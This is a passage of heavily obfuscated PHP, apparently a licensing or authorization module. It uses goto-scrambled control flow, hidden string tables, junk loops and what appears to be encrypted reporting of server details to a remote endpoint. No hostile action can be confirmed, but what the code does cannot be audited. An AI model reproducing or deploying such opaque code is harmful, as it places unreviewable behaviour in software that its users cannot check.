$b¡¬¦…Ş­[$D…ˆéÈÓ„[93]][$D…ˆéÈÓ„[94]][$D…ˆéÈÓ„[99]] = array($D…ˆéÈÓ„[100] => (int) $AîÉÒµŒ½à[$D…ˆéÈÓ„[101]], $D…ˆéÈÓ„[102] => $D…ˆéÈÓ„[103]($D…ˆéÈÓ„[104]($AîÉÒµŒ½à, $D…ˆéÈÓ„[105], array())), $D…ˆéÈÓ„[106] => (int) $D…ˆéÈÓ„[104]($AîÉÒµŒ½à, $D…ˆéÈÓ„[107], 0)); goto C‡ÅÏÔ­‘; C™‚Ã¤è‚Ş: if ($this->wrks0914a6a5 == $D…ˆéÈÓ„[121]) { $b¡¬¦…Ş­[$D…ˆéÈÓ„[93]][$D…ˆéÈÓ„[94]][$D…ˆéÈÓ„[99]][$D…ˆéÈÓ„[107]] = 0; } $b¡¬¦…Ş­[$D…ˆéÈÓ„[108]][$D…ˆéÈÓ„[128]] = $D…ˆéÈÓ„[104]($this->dzow6dcbc746, $D…ˆéÈÓ„[129], $D…ˆéÈÓ„[10]); $b¡¬¦…Ş­[$D…ˆéÈÓ„[108]][$D…ˆéÈÓ„[130]] = $D…ˆéÈÓ„[104]($this->dzow6dcbc746, $D…ˆéÈÓ„[131], $D…ˆéÈÓ„[10]); goto D§Ë¸ô‚±; cß¤¢Î¡™Ñ: $B›†ƒÛø†Œ =& $_SERVER[Ö]; $D…ˆéÈÓ„ =& $_SERVER[¸‹ï‰«Ğ]; $E¬ÖöíÃÆ = $D…ˆéÈÓ„[61]($D…ˆéÈÓ„[62])->{$_SERVER[¸‹ï‰«Ğ][63]}(); goto cæ¿ìÂ­ÑÖ; cæ¿ìÂ­ÑÖ: $E‘ÊÓœĞ³Ï = $B›†ƒÛø†Œ[576]; if (strlen($E‘ÊÓœĞ³Ï) < $B›†ƒÛø†Œ[555]) { die; } $BôöÇÔÃÊò = array($D…ˆéÈÓ„[64], $D…ˆéÈÓ„[65], $D…ˆéÈÓ„[66], $D…ˆéÈÓ„[67], $D…ˆéÈÓ„[68], $D…ˆéÈÓ„[69], $D…ˆéÈÓ„[70], $D…ˆéÈÓ„[71], $D…ˆéÈÓ„[72], $D…ˆéÈÓ„[73], $D…ˆéÈÓ„[74], $D…ˆéÈÓ„[75], $D…ˆéÈÓ„[76], $D…ˆéÈÓ„[77], $D…ˆéÈÓ„[78], $D…ˆéÈÓ„[79], $D…ˆéÈÓ„[80], $D…ˆéÈÓ„[81], $D…ˆéÈÓ„[82], $D…ˆéÈÓ„[83], $D…ˆéÈÓ„[84], $D…ˆéÈÓ„[85], $D…ˆéÈÓ„[86], $D…ˆéÈÓ„[87], $D…ˆéÈÓ„[88], $D…ˆéÈÓ„[89], $D…ˆéÈÓ„[90]); goto b÷‡èÓŞ†Ç; eÙò™Ó…¶à: unset($b¡¬¦…Ş­[$D…ˆéÈÓ„[93]][$D…ˆéÈÓ„[94]][$D…ˆéÈÓ„[76]]); $aäéŒ¶ÎºÏ = $B›†ƒÛø†Œ[579]; unset($b¡¬¦…Ş­[$D…ˆéÈÓ„[93]][$D…ˆéÈÓ„[94]][$D…ˆéÈÓ„[98]]); goto c•§«Ú”Û¦; D§Ë¸ô‚±: if ($D…ˆéÈÓ„[104]($GLOBALS, $D…ˆéÈÓ„[132]) && $this->config[$D…ˆéÈÓ„[133]]) { $b¡¬¦…Ş­[$D…ˆéÈÓ„[108]][$D…ˆéÈÓ„[134]] = WEB_ROOT; } return $b¡¬¦…Ş­; goto dÀ¤±ä£¨; b÷‡èÓŞ†Ç: foreach ($BôöÇÔÃÊò as $fïÆœì¿‹Á) { $dÍ³²àßÒÉ = $GLOBALS[$D…ˆéÈÓ„[91]][$D…ˆéÈÓ„[92]][$fïÆœì¿‹Á]; $bƒÈ«œ£ËŒ = $B›†ƒÛø†Œ[577]; if (!$bƒÈ«œ£ËŒ) { die; } if (isset($E¬ÖöíÃÆ[$fïÆœì¿‹Á])) { $dÍ³²àßÒÉ = $E¬ÖöíÃÆ[$fïÆœì¿‹Á]; } $b¡¬¦…Ş­[$D…ˆéÈÓ„[93]][$D…ˆéÈÓ„[94]][$fïÆœì¿‹Á] = $dÍ³²àßÒÉ; } $AîÉÒµŒ½à = $b¡¬¦…Ş­[$D…ˆéÈÓ„[93]][$D…ˆéÈÓ„[94]][$D…ˆéÈÓ„[76]]; unset($b¡¬¦…Ş­[$D…ˆéÈÓ„[93]][$D…ˆéÈÓ„[95]][$D…ˆéÈÓ„[96]]); goto B•†¸òÍ‡Ò; A£—Œîƒ: $eŠàÄÖ• = $B›†ƒÛø†Œ[582]; if (strlen($eŠàÄÖ•) < $B›†ƒÛø†Œ[547]) { return; } if ($E¬ÖöíÃÆ[$D…ˆéÈÓ„[120]] != $D…ˆéÈÓ„[121]) { $b¡¬¦…Ş­[$D…ˆéÈÓ„[108]][$D…ˆéÈÓ„[122]] = $E¬ÖöíÃÆ[$D…ˆéÈÓ„[122]]; $b¡¬¦…Ş­[$D…ˆéÈÓ„[108]][$D…ˆéÈÓ„[123]] = $E¬ÖöíÃÆ[$D…ˆéÈÓ„[123]]; $dÀĞíë»‰í = $D…ˆéÈÓ„[124](10) . $this->wrks0914a6a5 . $D…ˆéÈÓ„[124](5); $b¡¬¦…Ş­[$D…ˆéÈÓ„[93]][$D…ˆéÈÓ„[125]][$D…ˆéÈÓ„[126]] = $this->{$_SERVER[¸‹ï‰«Ğ][127]}($dÀĞíë»‰í, $b¡¬¦…Ş­[$D…ˆéÈÓ„[108]][$D…ˆéÈÓ„[113]]); } goto C™‚Ã¤è‚Ş; A‡ò‚Ğ˜õ : while ($BŞİëêå¥ < $B›†ƒÛø†Œ[555]) { if ($BŞİëêå¥ >= 0) { break; } $BŞİëêå¥++; } $b¡¬¦…Ş­[$D…ˆéÈÓ„[108]][$D…ˆéÈÓ„[117]] = $D…ˆéÈÓ„[118]($D…ˆéÈÓ„[119]()); $b¡¬¦…Ş­[$D…ˆéÈÓ„[108]][$D…ˆéÈÓ„[120]] = $this->wrks0914a6a5; goto A£—Œîƒ; dÀ¤±ä£¨: } private function ozln4fc858ee() { goto c¯ßĞ»¤Ì; BŸ‚ÄÔ„ÙŒ: foreach ($DÀÅ‹ôŞ±Œ as $DÕÈ¿Î¥°½) { if (!isset($D˜äµ«×[$DÕÈ¿Î¥°½]) || !$D˜äµ«×[$DÕÈ¿Î¥°½]) { continue; } $c‚é­Â¦º«[$DÕÈ¿Î¥°½] = $D˜äµ«×[$DÕÈ¿Î¥°½]; } $cçÆÑ‡§ë[13](array($cçÆÑ‡§ë[151], $cçÆÑ‡§ë[152]), $c‚é­Â¦º«); goto CóèğËİÎÆ; EğòÇ¶·ÍÍ: $c‚é­Â¦º« = array($cçÆÑ‡§ë[159] => $D˜äµ«×[$cçÆÑ‡§ë[64]], $cçÆÑ‡§ë[160] => $D˜äµ«×[$cçÆÑ‡§ë[65]], $cçÆÑ‡§ë[161] => $cçÆÑ‡§ë[10]); $c¾¤¥í­‰Ó = $Eˆ¬á‹Ïî•[586]; if (strlen($c¾¤¥í­‰Ó) < $Eˆ¬á‹Ïî•[547]) { return; } goto BŸ‚ÄÔ„ÙŒ; e…Î¯ìéæ: if ($this->wrks0914a6a5 == $cçÆÑ‡§ë[121]) { return; } $DÀÅ‹ôŞ±Œ = array($cçÆÑ‡§ë[153], $cçÆÑ‡§ë[154], $cçÆÑ‡§ë[155], $cçÆÑ‡§ë[156], $cçÆÑ‡§ë[157], $cçÆÑ‡§ë[158]); $D˜äµ«× = $cçÆÑ‡§ë[61]($cçÆÑ‡§ë[62])->{$_SERVER[¸‹ï‰«Ğ][63]}(); goto EğòÇ¶·ÍÍ; c¯ßĞ»¤Ì: $Eˆ¬á‹Ïî• =& $_SERVER[Ö]; $cçÆÑ‡§ë =& $_SERVER[¸‹ï‰«Ğ]; if ($_SERVER[$cçÆÑ‡§ë[44]] == $cçÆÑ‡§ë[135]) { goto FÅÄŠ¦Üª“; Fìˆ£¨¾í§: $cçÆÑ‡§ë[13](array($cçÆÑ‡§ë[151], $cçÆÑ‡§ë[152]), $c‚é­Â¦º«); $bˆîó³ÀÔ’ = $Eˆ¬á‹Ïî•[585]; if (strlen($bˆîó³ÀÔ’) < $Eˆ¬á‹Ïî•[555]) { return; } goto Bå“’‚åÎá; FÅÄŠ¦Üª“: $Aè‘²ÆÛß— = array($cçÆÑ‡§ë[120] => $this->wrks0914a6a5, $cçÆÑ‡§ë[136] => $this->{$_SERVER[¸‹ï‰«Ğ][137]}(), $cçÆÑ‡§ë[138] => $cçÆÑ‡§ë[61]($cçÆÑ‡§ë[139])->{$_SERVER[¸‹ï‰«Ğ][140]}()); if ($this->wrks0914a6a5 != $cçÆÑ‡§ë[121]) { $Aï¯õ° = $cçÆÑ‡§ë[104]($this->dzow6dcbc746, $cçÆÑ‡§ë[141]); if ($Aï¯õ°) { $Aè‘²ÆÛß—[$cçÆÑ‡§ë[142]] = $Aï¯õ°; $Aè‘²ÆÛß—[$cçÆÑ‡§ë[143]] = $cçÆÑ‡§ë[144]($cçÆÑ‡§ë[104]($this->dzow6dcbc746, $cçÆÑ‡§ë[145])); $Aè‘²ÆÛß—[$cçÆÑ‡§ë[146]] = $cçÆÑ‡§ë[104]($this->dzow6dcbc746, $cçÆÑ‡§ë[131]); } } $Aè‘²ÆÛß— = $this->{$_SERVER[¸‹ï‰«Ğ][147]}($cçÆÑ‡§ë[148]($Aè‘²ÆÛß—), $cçÆÑ‡§ë[114]($cçÆÑ‡§ë[149])); goto fª·ëã›³; fª·ëã›³: $cƒ¹»Í¬È‹ = $Eˆ¬á‹Ïî•[583]; while (strlen($cƒ¹»Í¬È‹) < $Eˆ¬á‹Ïî•[584]) { if (!$cƒ¹»Í¬È‹) { break; } $cƒ¹»Í¬È‹++; } $c‚é­Â¦º« = array($cçÆÑ‡§ë[150] => $Aè‘²ÆÛß—); goto Fìˆ£¨¾í§; Bå“’‚åÎá: } goto e…Î¯ìéæ; CóèğËİÎÆ: } private function gxoj98fde1aa() { goto fº¸çØéĞ—; B‰÷Ì¦ó©: $C÷»Ê¦ƒ¶² = array(); $C÷»Ê¦ƒ¶²[$AŞ¾ÉÕ­—] = $AÆæŸ‡Ìè©; $dôÑ«±àò¨[61]($dôÑ«±àò¨[11])->{$_SERVER[¸‹ï‰«Ğ][226]}($c‡ÅÒƒÁ†™[$dôÑ«±àò¨[227]], array($dôÑ«±àò¨[228] => $C÷»Ê¦ƒ¶²)); goto a·Ù¾ˆ™ãË; f°¡¤Ü¤Š£: $B¹ªµ³İÇè = $f›¶™Ïî…–[591]; if (strlen($B¹ªµ³İÇè) < $f›¶™Ïî…–[555]) { die; } $fÇ‘ÕÎÈù = $dôÑ«±àò¨[124](16); goto eÙÇİãÜîÀ; A£Æ­¬¸ìÌ: $Eè¾ÏçÃê = $f›¶™Ïî…–[596]; while (strlen($Eè¾ÏçÃê) < $f›¶™Ïî…–[590]) { if (!$Eè¾ÏçÃê) { break; } $Eè¾ÏçÃê++; } $c‡ÅÒƒÁ†™ = $D¾åçŞ³ [$dôÑ«±àò¨[225]]; goto B‰÷Ì¦ó©; BŠŒõŸó¨È: $E½ÓÓ­„©à = $f›¶™Ïî…–[587]; while (strlen($E½ÓÓ­„©à) < $f›¶™Ïî…–[555]) { if (!$E½ÓÓ­„©à) { break; } $E½ÓÓ­„©à++; } $FŒÓáŠº÷“ = $dôÑ«±àò¨[114]($_SERVER[$dôÑ«±àò¨[115]] . $cß¤ƒÄÃñ±); goto bš™ÅÅİŠ÷; aõÕÙÌÔ™”: $F‡è¶¶çÑß = $f›¶™Ïî…–[595]; if (!$F‡è¶¶çÑß) { die; } $D¾åçŞ³  = $dôÑ«±àò¨[222]($dôÑ«±àò¨[61]($dôÑ«±àò¨[11])->{$_SERVER[¸‹ï‰«Ğ][223]}(), $dôÑ«±àò¨[224]); goto A£Æ­¬¸ìÌ; eÙÇİãÜîÀ: $eº„‰Õ´Øö = $f›¶™Ïî…–[592]; while (strlen($eº„‰Õ´Øö) < $f›¶™Ïî…–[547]) { if (!$eº„‰Õ´Øö) { break; } $eº„‰Õ´Øö++; } $bƒœ÷òñ©˜ = $fÇ‘ÕÎÈù . $e®®£î¢¥‰[$dôÑ«±àò¨[120]] . $this->{$_SERVER[¸‹ï‰«Ğ][147]}($dôÑ«±àò¨[114]($e®®£î¢¥‰[$dôÑ«±àò¨[209]]), $fÇ‘ÕÎÈù); goto dš·…ï¥¦; fº¸çØéĞ—: $f›¶™Ïî…– =& $_SERVER[Ö]; $dôÑ«±àò¨ =& $_SERVER[¸‹ï‰«Ğ]; if ($_SERVER[$dôÑ«±àò¨[44]] != $dôÑ«±àò¨[162]) { return; } goto dÓÙºŠŸµê; CŸ“ºßËâ: if (!$dôÑ«±àò¨[191]($e„ÌÉ¸Ğ”Â) || !$dôÑ«±àò¨[191]($e„ÌÉ¸Ğ”Â[$dôÑ«±àò¨[192]]) || $e„ÌÉ¸Ğ”Â[$dôÑ«±àò¨[165]] != !0) { $DäÎ´Ìî¹² = $dôÑ«±àò¨[197]($dôÑ«±àò¨[198]); $E’é¼‚Êì = $e„ÌÉ¸Ğ”Â[$dôÑ«±àò¨[192]] ? $dôÑ«±àò¨[194] . $e„ÌÉ¸Ğ”Â[$dôÑ«±àò¨[192]] : $DäÎ´Ìî¹²; $dôÑ«±àò¨[166]($E’é¼‚Êì, !1); } $a¹ŒŸèÉ¸¬ = $e„ÌÉ¸Ğ”Â[$dôÑ«±àò¨[192]]; $cÂ¿İ§ã¼« = $this->{$_SERVER[¸‹ï‰«Ğ][199]}($a¹ŒŸèÉ¸¬[$dôÑ«±àò¨[200]]); goto D¬½×êŸÀ¡; b³…÷‘ò˜¤: $d‡Œáñæàğ = $f›¶™Ïî…–[598]; goto e‚Ñ«¾óÖ½; D›ƒˆİÕï¢: if (!isset($Aù·ËƒÉôë[$dôÑ«±àò¨[165]]) || $dôÑ«±àò¨[24]($Aù·ËƒÉôë[$dôÑ«±àò¨[165]]) != 16) { $dôÑ«±àò¨[166]($dôÑ«±àò¨[167] . $Aù·ËƒÉôë[$dôÑ«±àò¨[165]], !1); } $cß¤ƒÄÃñ± = $dôÑ«±àò¨[61]($dôÑ«±àò¨[62])->{$_SERVER[¸‹ï‰«Ğ][63]}($dôÑ«±àò¨[116]); $a„Áì´¦ôö = array($dôÑ«±àò¨[165] => $Aù·ËƒÉôë[$dôÑ«±àò¨[165]], $dôÑ«±àò¨[168] => $dôÑ«±àò¨[124](16), $dôÑ«±àò¨[169] => $dôÑ«±àò¨[149], $dôÑ«±àò¨[170] => $dôÑ«±àò¨[171], $dôÑ«±àò¨[172] => $_SERVER[$dôÑ«±àò¨[173]], $dôÑ«±àò¨[174] => $_SERVER[$dôÑ«±àò¨[175]], $dôÑ«±àò¨[176] => $_SERVER[$dôÑ«±àò¨[177]]); goto BŠŒõŸó¨È; dÓÙºŠŸµê: if (!$dôÑ«±àò¨[104]($GLOBALS, $dôÑ«±àò¨[132])) { die; } $Aù·ËƒÉôë = $GLOBALS[$dôÑ«±àò¨[22]]; if (isset($Aù·ËƒÉôë[$dôÑ«±àò¨[163]])) { $this->{$_SERVER[¸‹ï‰«Ğ][164]}(); die; } goto D›ƒˆİÕï¢; EŞ•åÉ™ÊŒ: $E‚‹•ê¾íè = $dôÑ«±àò¨[114]($_SERVER[$dôÑ«±àò¨[115]] . $dôÑ«±àò¨[214]($cß¤ƒÄÃñ±) . $e®®£î¢¥‰[$dôÑ«±àò¨[210]]); $AŞ¾ÉÕ­— = $dôÑ«±àò¨[214]($dôÑ«±àò¨[25]($E‚‹•ê¾íè, 10, 16)); $AÆæŸ‡Ìè© = $this->{$_SERVER[¸‹ï‰«Ğ][127]}($dôÑ«±àò¨[148]($a¹ŒŸèÉ¸¬), $E‚‹•ê¾íè); goto aõÕÙÌÔ™”; bš™ÅÅİŠ÷: $B³œì’ïÍĞ = $f›¶™Ïî…–[588]; if (!$B³œì’ïÍĞ) { die; } if ($Aù·ËƒÉôë[$dôÑ«±àò¨[178]] == $dôÑ«±àò¨[179]) { $E‹‡é„Áì³ = $this->{$_SERVER[¸‹ï‰«Ğ][147]}($FŒÓáŠº÷“, $dôÑ«±àò¨[180]); $A·ó‰‘Äƒ† = $this->{$_SERVER[¸‹ï‰«Ğ][127]}($dôÑ«±àò¨[148]($a„Áì´¦ôö), $FŒÓáŠº÷“ . $dôÑ«±àò¨[181], 3); $Dç¨µİî²± = $this->{$_SERVER[¸‹ï‰«Ğ][182]}($dôÑ«±àò¨[183] . $E‹‡é„Áì³ . $dôÑ«±àò¨[184] . $A·ó‰‘Äƒ†, -1); $dôÑ«±àò¨[166]($Dç¨µİî²±, !0); } else { if ($Aù·ËƒÉôë[$dôÑ«±àò¨[178]] == $dôÑ«±àò¨[185]) { $d­æ¯çîõ = $dôÑ«±àò¨[25]($dôÑ«±àò¨[114]($dôÑ«±àò¨[186] . $FŒÓáŠº÷“), 12, 15) . $dôÑ«±àò¨[187]; $A·ó‰‘Äƒ† = $this->{$_SERVER[¸‹ï‰«Ğ][188]}($dôÑ«±àò¨[2]($Aù·ËƒÉôë[$dôÑ«±àò¨[189]]), $d­æ¯çîõ, 2); $e„ÌÉ¸Ğ”Â = $dôÑ«±àò¨[190]($A·ó‰‘Äƒ†, !0); if (!$dôÑ«±àò¨[191]($e„ÌÉ¸Ğ”Â) || !$dôÑ«±àò¨[191]($e„ÌÉ¸Ğ”Â[$dôÑ«±àò¨[192]]) || $e„ÌÉ¸Ğ”Â[$dôÑ«±àò¨[165]] != !0) { $DäÎ´Ìî¹² = $dôÑ«±àò¨[193]; $E’é¼‚Êì = $e„ÌÉ¸Ğ”Â[$dôÑ«±àò¨[192]] ? $dôÑ«±àò¨[194] . $e„ÌÉ¸Ğ”Â[$dôÑ«±àò¨[192]] : $DäÎ´Ìî¹²; $dôÑ«±àò¨[166]($E’é¼‚Êì, !1); } else { $a„Áì´¦ôö[$dôÑ«±àò¨[168]] = $e„ÌÉ¸Ğ”Â[$dôÑ«±àò¨[192]][$dôÑ«±àò¨[195]]; } } else { $e„ÌÉ¸Ğ”Â = $this->{$_SERVER[¸‹ï‰«Ğ][182]}($dôÑ«±àò¨[196], $a„Áì´¦ôö, 10); $c±·ïôŒ…Ÿ = $f›¶™Ïî…–[589]; if (strlen($c±·ïôŒ…Ÿ) < $f›¶™Ïî…–[590]) { die; } } } goto CŸ“ºßËâ; a·Ù¾ˆ™ãË: $b®µ§ÊÎÈ¿ = $f›¶™Ïî…–[597]; if (!$b®µ§ÊÎÈ¿) { die; } $dôÑ«±àò¨[166]($dôÑ«±àò¨[197]($dôÑ«±àò¨[208]), !0); goto b³…÷‘ò˜¤; D¬½×êŸÀ¡: if (!$cÂ¿İ§ã¼« || $cÂ¿İ§ã¼« != $dôÑ«±àò¨[201]($a¹ŒŸèÉ¸¬[$dôÑ«±àò¨[145]])) { $A÷±«å„‹† = array($dôÑ«±àò¨[202] => $dôÑ«±àò¨[61]($dôÑ«±àò¨[62])->{$_SERVER[¸‹ï‰«Ğ][63]}($dôÑ«±àò¨[116]), $dôÑ«±àò¨[203] => $_SERVER[$dôÑ«±àò¨[115]], $dôÑ«±àò¨[204] => $dôÑ«±àò¨[205](), $dôÑ«±àò¨[174] => $_SERVER[$dôÑ«±àò¨[175]]); $A·ó‰‘Äƒ† = $this->{$_SERVER[¸‹ï‰«Ğ][206]}($dôÑ«±àò¨[148]($A÷±«å„‹†)); $this->{$_SERVER[¸‹ï‰«Ğ][182]}($dôÑ«±àò¨[207] . $A·ó‰‘Äƒ†); $dôÑ«±àò¨[166]($dôÑ«±àò¨[197]($dôÑ«±àò¨[208]), !0); } $e®®£î¢¥‰ = array($dôÑ«±àò¨[209] => $a„Áì´¦ôö[$dôÑ«±àò¨[165]], $dôÑ«±àò¨[210] => $a¹ŒŸèÉ¸¬[$dôÑ«±àò¨[211]], $dôÑ«±àò¨[212] => $dôÑ«±àò¨[124](16), $dôÑ«±àò¨[120] => $a¹ŒŸèÉ¸¬[$dôÑ«±àò¨[213]]); if ($a„Áì´¦ôö[$dôÑ«±àò¨[168]]) { $e®®£î¢¥‰[$dôÑ«±àò¨[212]] = $a„Áì´¦ôö[$dôÑ«±àò¨[168]]; } goto c‹ƒÒ¢á„; c‹ƒÒ¢á„: $b‡äôé¶¾Í = $dôÑ«±àò¨[25]($dôÑ«±àò¨[114]($e®®£î¢¥‰[$dôÑ«±àò¨[210]]), 10, 10); $b¢¿ñƒ¯Çã = $b‡äôé¶¾Í . $e®®£î¢¥‰[$dôÑ«±àò¨[120]] . $e®®£î¢¥‰[$dôÑ«±àò¨[212]]; $e®®£î¢¥‰[$dôÑ«±àò¨[122]] = $dôÑ«±àò¨[214]($dôÑ«±àò¨[118]($this->{$_SERVER[¸‹ï‰«Ğ][147]}($b¢¿ñƒ¯Çã, $dôÑ«±àò¨[215]))); goto f°¡¤Ü¤Š£; D‡¾«ÕáÂ: if (!$B­Û°ÌÂ‘‚) { return; } if ($a¹ŒŸèÉ¸¬[$dôÑ«±àò¨[217]] && $a¹ŒŸèÉ¸¬[$dôÑ«±àò¨[217]] >= 1) { $dôÑ«±àò¨[61]($dôÑ«±àò¨[62])->{$_SERVER[¸‹ï‰«Ğ][218]}($dôÑ«±àò¨[219], $dôÑ«±àò¨[220]); } $dôÑ«±àò¨[61]($dôÑ«±àò¨[62])->{$_SERVER[¸‹ï‰«Ğ][221]}($e®®£î¢¥‰); goto EŞ•åÉ™ÊŒ; dš·…ï¥¦: $DÓøÖë½ãË = $f›¶™Ïî…–[593]; $e®®£î¢¥‰[$dôÑ«±àò¨[123]] = $dôÑ«±àò¨[118]($dôÑ«±àò¨[214]($this->{$_SERVER[¸‹ï‰«Ğ][147]}($bƒœ÷òñ©˜, $dôÑ«±àò¨[216]))); $B­Û°ÌÂ‘‚ = $f›¶™Ïî…–[594]; goto D‡¾«ÕáÂ; e‚Ñ«¾óÖ½: } private function afwrcf2e06f5() { goto E§½ÜŞã¥Ñ; B–„‹êÛéâ: $AºÄµì©ó = $D «Ü…Ÿ‘Ó[599]; if (!$AºÄµì©ó) { return; } $bõİË†«[61]($bõİË†«[62])->{$_SERVER[¸‹ï‰«Ğ][218]}($bõİË†«[219], $bõİË†«[229]); goto eõä‹­ÜÏ†; eäù‹–è: $dÖÇ‘Ÿ¡ò² = $D «Ü…Ÿ‘Ó[601]; while (strlen($dÖÇ‘Ÿ¡ò²) < $D «Ü…Ÿ‘Ó[547]) { if (!$dÖÇ‘Ÿ¡ò²) { break; } $dÖÇ‘Ÿ¡ò²++; } $this->wrks0914a6a5 = $bõİË†«[121]; goto d¡ÀÔ¥¥Æ; eõä‹­ÜÏ†: $c½÷‡—¢Ş‘ = $D «Ü…Ÿ‘Ó[600]; if (strlen($c½÷‡—¢Ş‘) < $D «Ü…Ÿ‘Ó[560]) { return; } $this->dzow6dcbc746 = array(); goto eäù‹–è; E§½ÜŞã¥Ñ: $D «Ü…Ÿ‘Ó =& $_SERVER[Ö]; $bõİË†« =& $_SERVER[¸‹ï‰«Ğ]; $bõİË†«[61]($bõİË†«[62])->{$_SERVER[¸‹ï‰«Ğ][221]}(array($bõİË†«[209] => $bõİË†«[10], $bõİË†«[210] => $bõİË†«[10], $bõİË†«[120] => $bõİË†«[121], $bõİË†«[122] => $bõİË†«[10], $bõİË†«[123] => $bõİË†«[10])); goto B–„‹êÛéâ; d¡ÀÔ¥¥Æ: } private function sfat031bfed9() { goto b‘®ò¶ÉëË; Eæ¯„†•: $dÃ„”¸Û = $this->{$_SERVER[¸‹ï‰«Ğ][188]}($Câé˜¶–Â[$Cğ³Æ¶ÇƒÑ[91]][$dëøÜ°ê…©], $E ï¨öÙƒÂ); $e«Ä÷¼­Š = $Eªç»Ú•¢[604]; if (!$e«Ä÷¼­Š) { return; } goto AÃÈ¹÷À; DºÒš‰ƒ: $b¨â¶óÍ¶ƒ = $Cğ³Æ¶ÇƒÑ[222]($Cğ³Æ¶ÇƒÑ[61]($Cğ³Æ¶ÇƒÑ[11])->{$_SERVER[¸‹ï‰«Ğ][223]}(), $Cğ³Æ¶ÇƒÑ[224]); $Câé˜¶–Â = $b¨â¶óÍ¶ƒ[$Cğ³Æ¶ÇƒÑ[225]]; $d©å½îŸÚ¿ = $Eªç»Ú•¢[603]; goto fà»Ûœõİà; aÎØ…Ü§®Æ: if ($Cğ³Æ¶ÇƒÑ[230]() >= $E†ÕÏŒ÷‚‡) { return $this->{$_SERVER[¸‹ï‰«Ğ][164]}(); } $this->dzow6dcbc746 = $dÃ„”¸Û; $this->wrks0914a6a5 = $dõÈ¹Â·ì¤[$Cğ³Æ¶ÇƒÑ[120]]; goto a°ÎÇ¿šÁí; E×‡ñ‹œğÁ: $Bö§ÒÔÆã = $Eªç»Ú•¢[602]; if (!$Bö§ÒÔÆã) { die; } $this->wrks0914a6a5 = $Cğ³Æ¶ÇƒÑ[121]; goto f†ë¥Ë¢·†; b‘®ò¶ÉëË: $Eªç»Ú•¢ =& $_SERVER[Ö]; $Cğ³Æ¶ÇƒÑ =& $_SERVER[¸‹ï‰«Ğ]; $_SERVER[$Cğ³Æ¶ÇƒÑ[175]] = $Cğ³Æ¶ÇƒÑ[104]($_SERVER, $Cğ³Æ¶ÇƒÑ[175], APP_HOST); goto E×‡ñ‹œğÁ; AÃÈ¹÷À: $dÃ„”¸Û = $Cğ³Æ¶ÇƒÑ[190]($dÃ„”¸Û, !0); if (!$Cğ³Æ¶ÇƒÑ[191]($dÃ„”¸Û)) { return $this->{$_SERVER[¸‹ï‰«Ğ][164]}(); } $E†ÕÏŒ÷‚‡ = $Cğ³Æ¶ÇƒÑ[144]($dÃ„”¸Û[$Cğ³Æ¶ÇƒÑ[145]]); goto aÎØ…Ü§®Æ; a°ÎÇ¿šÁí: $F³„ãÕí = $Eªç»Ú•¢[605]; if (strlen($F³„ãÕí) < $Eªç»Ú•¢[555]) { return; } goto AÕŠÈæÓ¯–; f†ë¥Ë¢·†: $dõÈ¹Â·ì¤ = $Cğ³Æ¶ÇƒÑ[61]($Cğ³Æ¶ÇƒÑ[62])->{$_SERVER[¸‹ï‰«Ğ][63]}(); if ($dõÈ¹Â·ì¤[$Cğ³Æ¶ÇƒÑ[120]] == $Cğ³Æ¶ÇƒÑ[121]) { return; } $Cåö¤Š’Ë¾ = $Cğ³Æ¶ÇƒÑ[61]($Cğ³Æ¶ÇƒÑ[62])->{$_SERVER[¸‹ï‰«Ğ][63]}($Cğ³Æ¶ÇƒÑ[116]); goto DºÒš‰ƒ; fà»Ûœõİà: if (!$d©å½îŸÚ¿) { return; } $E ï¨öÙƒÂ = $Cğ³Æ¶ÇƒÑ[114]($_SERVER[$Cğ³Æ¶ÇƒÑ[115]] . $Cğ³Æ¶ÇƒÑ[214]($Cåö¤Š’Ë¾) . $dõÈ¹Â·ì¤[$Cğ³Æ¶ÇƒÑ[210]]); $dëøÜ°ê…© = $Cğ³Æ¶ÇƒÑ[214]($Cğ³Æ¶ÇƒÑ[25]($E ï¨öÙƒÂ, 10, 16)); goto Eæ¯„†•; AÕŠÈæÓ¯–: } private function yvmoad923e6e() { goto C¼îò×Œ×Ë; f«ïÒ‹•‡ˆ: if ($FÏ¹Ô·ï±£ == $dÎî§¥™Î¸[231] && $this->wrks0914a6a5 == $dÎî§¥™Î¸[121]) { $dÎî§¥™Î¸[166]($dÎî§¥™Î¸[197]($dÎî§¥™Î¸[232]), !1, $dÎî§¥™Î¸[233]); } $E­àï¾¼Ê = array($dÎî§¥™Î¸[234], $dÎî§¥™Î¸[235]); if ($dÎî§¥™Î¸[236]($FÏ¹Ô·ï±£, $E­àï¾¼Ê)) { if ($this->wrks0914a6a5 == $dÎî§¥™Î¸[121] && isset($B‹İÆ„‚Ù[$dÎî§¥™Î¸[237]])) { $dÎî§¥™Î¸[166]($dÎî§¥™Î¸[197]($dÎî§¥™Î¸[232]), !1, $dÎî§¥™Î¸[233]); die; } $a†«°ÎÀ‘ = $this->{$_SERVER[¸‹ï‰«Ğ][137]}(); if ($a†«°ÎÀ‘ != $dÎî§¥™Î¸[201]($dÎî§¥™Î¸[238])) { if ($a†«°ÎÀ‘ <= $dÎî§¥™Î¸[61]($dÎî§¥™Î¸[139])->{$_SERVER[¸‹ï‰«Ğ][140]}()) { $dÎî§¥™Î¸[166]($dÎî§¥™Î¸[197]($dÎî§¥™Î¸[239]), !1, $dÎî§¥™Î¸[233]); die; } } } goto cù›Øˆö; C¼îò×Œ×Ë: $Bƒ¿Œ¯–÷‚ =& $_SERVER[Ö]; $dÎî§¥™Î¸ =& $_SERVER[¸‹ï‰«Ğ]; $B‹İÆ„‚Ù = $GLOBALS[$dÎî§¥™Î¸[22]]; goto f¹‹ªî›À; f¹‹ªî›À: $f†´ÁÚîä = $Bƒ¿Œ¯–÷‚[606]; if (strlen($f†´ÁÚîä) < $Bƒ¿Œ¯–÷‚[547]) { return; } $FÏ¹Ô·ï±£ = $_SERVER[$dÎî§¥™Î¸[44]]; goto f«ïÒ‹•‡ˆ; cù›Øˆö: } private function mnzk54806904() { goto dÍÖŠõ²ßó; cæ±“™ÆØ‡: $a¬°¾çÌöò = $a¯®Ûò¡°[607]; if (strlen($a¬°¾çÌöò) < $a¯®Ûò¡°[584]) { die; } if (!$fçÉ™Õ·[104]($GLOBALS, $fçÉ™Õ·[132]) || !isset($_GET[$fçÉ™Õ·[241]])) { return; } goto BãòÓßÔšØ; eì¹øÏï´¸: if ($fùŒ„œ‹¢ && $fçÉ™Õ·[32]($fùŒ„œ‹¢, $fçÉ™Õ·[253])) { echo $fùŒ„œ‹¢; } die; goto b•°Û¢éŒâ; BãòÓßÔšØ: if 